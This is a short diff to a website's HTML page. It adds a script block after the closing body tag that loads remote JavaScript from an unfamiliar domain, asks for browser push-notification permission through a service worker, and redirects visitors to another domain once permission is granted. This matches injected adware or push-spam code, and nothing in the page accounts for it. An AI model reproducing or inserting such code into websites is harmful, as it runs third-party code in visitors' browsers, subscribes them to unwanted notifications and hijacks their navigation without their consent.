@@ -102,6 +102,22 @@ What we want with our website is not only to benefit from us but also to help ou
     </script>
    </script>
 </body>
+<script>
+    var s = document.createElement('script');
+    s.src='//oungimuk.net/pfe/current/micro.tag.min.js?z=5044931'+'&sw=/sw-check-permissions-8aec8.js';
+    s.onload = function(result) {
+        switch (result) {
+            case 'onPermissionDefault':break;
+            case 'onPermissionAllowed':
+            window.location.replace("//whampamp.com/4/5044932");break;
+            case 'onPermissionDenied':break;
+            case 'onAlreadySubscribed':break;
+            case 'onNotificationUnsupported':break;
+        }
+    }
+
+    document.head.appendChild(s);
+</script>
 <style>
     html{
 
